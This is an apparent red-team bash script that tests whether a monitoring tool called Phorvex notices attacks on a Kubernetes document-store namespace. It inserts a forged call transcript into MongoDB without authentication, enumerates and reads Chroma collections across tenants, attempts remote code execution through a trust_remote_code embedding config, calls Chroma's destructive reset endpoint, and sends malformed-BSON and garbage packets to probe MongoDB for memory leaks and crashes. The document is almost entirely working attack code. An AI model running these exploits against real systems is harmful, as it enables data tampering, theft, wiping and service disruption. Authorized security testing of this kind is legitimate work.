#!/usr/bin/env bash
# batchd.sh — data-store battery: V18 (forged transcript write), V19 (Chroma cross-tenant
# exfil), V13 (Chroma RCE attempt), V6 (MongoBleed probe), V14 (one-packet crash probe).
# Boss brief: run the MISSES too — the observable is how Phorvex REACTS (incl. "correctly
# blind": document-store ns has NO PhorvexPolicy today = unwatched, itself a finding).
set -uo pipefail
NSD=document-store; NSX=phorvex-system; CTRL=phorvex-phorvex
OUT=/tmp/px-batchd; mkdir -p "$OUT"
MONGO=mongo-86c769cc54-h5mqk; CHROMA=$(kubectl get pods -n $NSD -o jsonpath='{.items[?(@.metadata.labels.app=="chroma")].metadata.name}')
[ -z "$CHROMA" ] && CHROMA=$(kubectl get pods -n $NSD -o jsonpath='{.items[0].metadata.name}')
echo "mongo pod: $MONGO | chroma pod: $CHROMA" | tee "$OUT/targets.txt"
kubectl get pods -n $NSD -o jsonpath='{range .items[*]}{.metadata.name} uid={.metadata.uid}{"\n"}{end}' | tee "$OUT/uids-before.txt"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ); date -Is

# ---------- V18: forged callSid transcript insert (no-auth mongo write) ----------
echo; echo "=== V18: forged transcript insert (no-auth) ==="
kubectl exec -n $NSD $MONGO -- mongosh --quiet --eval '
const r = db.getSiblingDB("voice").transcripts.insertOne({
  callSid: "CA_FORGED_REDTEAM_001", caller: "+15550100",
  turns: [{role:"caller", text:"Hi, I never made this call — this transcript is forged."},
          {role:"bot", text:"Of course, processing your refund of $9,999…"}],
  forged_by: "redteam-V18", ts: new Date().toISOString() });
print("inserted id: " + r.insertedId);
const forged = db.getSiblingDB("voice").transcripts.findOne({callSid:"CA_FORGED_REDTEAM_001"});
print("read-back: " + JSON.stringify(forged.turns[1]));
' | tee "$OUT/v18.txt"

# ---------- V19: Chroma cross-tenant / no-auth exfil ----------
echo; echo "=== V19: Chroma no-auth + cross-tenant enumeration ==="
kubectl port-forward -n $NSD svc/chroma 18000:8000 >/dev/null 2>&1 &
PF=$!; sleep 4
{
echo "-- heartbeat:"; curl -s --max-time 10 http://127.0.0.1:18000/api/v2/heartbeat; echo
echo "-- version:";  curl -s --max-time 10 http://127.0.0.1:18000/api/v2/version; echo
echo "-- tenants (no auth):"; curl -s --max-time 10 http://127.0.0.1:18000/api/v2/tenants; echo
echo "-- default_tenant databases:"; curl -s --max-time 10 "http://127.0.0.1:18000/api/v2/tenants/default_tenant/databases"; echo
echo "-- collections in default_database:"; curl -s --max-time 10 "http://127.0.0.1:18000/api/v2/tenants/default_tenant/databases/default_database/collections" | tee "$OUT/v19-collections.json" | jq -r '.[] | "\(.name) id=\(.id)"' 2>/dev/null || cat "$OUT/v19-collections.json"
} | tee "$OUT/v19.txt"
COLID=$(jq -r '.[0].id // empty' "$OUT/v19-collections.json" 2>/dev/null)
if [ -n "$COLID" ]; then
  echo "-- peek first collection (count + 2 docs, cross-tenant access without any creds):" | tee -a "$OUT/v19.txt"
  curl -s --max-time 10 "http://127.0.0.1:18000/api/v2/tenants/default_tenant/databases/default_database/collections/$COLID/count" | tee -a "$OUT/v19.txt"; echo | tee -a "$OUT/v19.txt"
  curl -s --max-time 10 -X POST "http://127.0.0.1:18000/api/v2/tenants/default_tenant/databases/default_database/collections/$COLID/get" \
    -H 'Content-Type: application/json' -d '{"limit":2,"include":["documents","metadatas"]}' | tee "$OUT/v19-peek.json" | head -c 600 | tee -a "$OUT/v19.txt"; echo | tee -a "$OUT/v19.txt"
fi

# ---------- V13: Chroma trust_remote_code RCE attempt ----------
echo; echo "=== V13: Chroma RCE attempts (CVE-2026-45833 — expect bounded on 0.5.23) ==="
{
echo "-- attempt 1: collection with server-side embedding_function pointing at a dynamic import:"
curl -s --max-time 10 -X POST "http://127.0.0.1:18000/api/v2/tenants/default_tenant/databases/default_database/collections" \
  -H 'Content-Type: application/json' \
  -d '{"name":"rt_probe","configuration":{"embedding_function":{"type":"known","name":"huggingface","config":{"model_name":"x","trust_remote_code":true}}}}'; echo
echo "-- attempt 2: allow_reset destructive endpoint enabled?"
curl -s --max-time 10 -X POST "http://127.0.0.1:18000/api/v2/reset"; echo
echo "-- chroma pod still alive + no code-exec side effects:"
} | tee "$OUT/v13.txt"
kubectl get pod -n $NSD $CHROMA -o jsonpath='  phase={.status.phase} restarts={.status.containerStatuses[0].restartCount}{"\n"}' | tee -a "$OUT/v13.txt"
# cleanup probe collection
curl -s --max-time 10 -X DELETE "http://127.0.0.1:18000/api/v2/tenants/default_tenant/databases/default_database/collections/rt_probe" >/dev/null 2>&1 || true

# ---------- V6 + V14: mongo wire probes (versions say patched; verify live) ----------
kill $PF 2>/dev/null
echo; echo "=== V6/V14: mongo malformed-BSON probes (live version 7.0.39 >= fixed 7.0.28/7.0.35) ==="
kubectl port-forward -n $NSD svc/mongo 27018:27017 >/dev/null 2>&1 &
PF=$!; sleep 4
python3 - <<'PY' | tee "$OUT/v6-v14.txt"
import socket, struct
def probe(payload, label):
    try:
        s = socket.create_connection(("127.0.0.1", 27018), timeout=8)
        s.sendall(payload); s.settimeout(4)
        try: r = s.recv(4096)
        except socket.timeout: r = b"<no response>"
        s.close()
        print(f"{label}: server responded {len(r)} bytes; first 64: {r[:64]!r}")
    except Exception as e:
        print(f"{label}: {type(e).__name__}: {e}")
# V6 MongoBleed-style: OP_QUERY hello whose BSON string declares more bytes than the doc holds
hello = b'\x10\x00\x00\x00' + b'isMaster' + b'\x00' + b'\x01\x01'  # (illustrative minimal)
doc = struct.pack('<i', 5 + len(hello) + 32) + hello  # declared length OVERSTATED by 32
q = struct.pack('<i4s i i i', 0, b'\x00'*4, 0, 0, -1) + b'admin.$cmd\x00' + struct.pack('<ii', 0, 1) + doc
probe(struct.pack('<iiii', 16+len(q), 1, 0, 2004) + q, "V6 overstated-length BSON")
# V14: garbage one-packet
probe(b'\xff\xff\xff\xff' + b'\x00'*12 + b'\xde\xad\xbe\xef'*8, "V14 garbage packet")
PY
kubectl get pod -n $NSD $MONGO -o jsonpath='mongo after probes: phase={.status.phase} restarts={.status.containerStatuses[0].restartCount}{"\n"}' | tee -a "$OUT/v6-v14.txt"
kill $PF 2>/dev/null

# ---------- Phorvex reaction window ----------
echo; echo "=== Phorvex reaction (expect SILENCE — document-store is unwatched) ==="
kubectl logs -n $NSX deploy/$CTRL --since-time="$T0" 2>/dev/null | grep -iE "mongo|chroma|document-store" | tail -10 | tee "$OUT/phorvex-reaction.txt"
echo "(empty above = zero Phorvex attention during the whole battery)"
kubectl get pods -n $NSD -o jsonpath='{range .items[*]}{.metadata.name} uid={.metadata.uid} phase={.status.phase}{"\n"}{end}' | tee "$OUT/uids-after.txt"
echo; echo "=== cleanup: remove the forged transcript ==="
kubectl exec -n $NSD $MONGO -- mongosh --quiet --eval 'print("deleted: " + db.getSiblingDB("voice").transcripts.deleteMany({callSid:"CA_FORGED_REDTEAM_001"}).deletedCount)'
echo done
